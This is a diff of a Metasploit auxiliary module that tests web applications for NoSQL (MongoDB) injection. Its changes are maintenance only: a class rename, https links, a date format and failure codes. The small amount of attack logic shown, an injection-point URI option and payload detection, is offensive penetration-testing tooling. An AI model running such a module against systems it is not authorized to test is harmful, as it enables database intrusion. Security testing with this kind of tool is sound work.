@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
-## Current source: https://github.com/rapid7/metasploit-framework
-###
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
 
-require 'msf/core'
-
-class Metasploit4 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
@@ -22,16 +19,16 @@ class Metasploit4 < Msf::Auxiliary
         ['Brandon Perry <bperry.volatile[at]gmail.com>'],
       'References'     =>
         [
-          ['URL', 'http://nosql.mypopescu.com/post/14453905385/attacking-nosql-and-node-js-server-side-javascript']
+          ['URL', 'https://nosql.mypopescu.com/post/14453905385/attacking-nosql-and-nodejs-server-side#_=_']
         ],
       'Platform'       => ['linux', 'win'],
       'Privileged'     => false,
-      'DisclosureDate' => "Jun 7 2014"))
+      'DisclosureDate' => '2014-06-07'))
 
       register_options(
       [
         OptString.new('TARGETURI', [ true, 'Full vulnerable URI with [NoSQLi] where the injection point is', '/index.php?age=50[NoSQLi]'])
-      ], self.class)
+      ])
   end
 
   def syntaxes
@@ -50,7 +47,7 @@ class Metasploit4 < Msf::Auxiliary
     })
 
     if !res
-      fail_with("Server did not respond in an expected way.")
+      fail_with(Failure::UnexpectedReply, "Server did not respond in an expected way.")
     end
 
     pay = ""
@@ -81,7 +78,7 @@ class Metasploit4 < Msf::Auxiliary
     end
 
     if pay == ''
-      fail_with("Couldn't detect a payload, maybe it isn't injectable.")
+      fail_with(Failure::Unknown, "Couldn't detect a payload, maybe it isn't injectable.")
     end
 
     length = 0
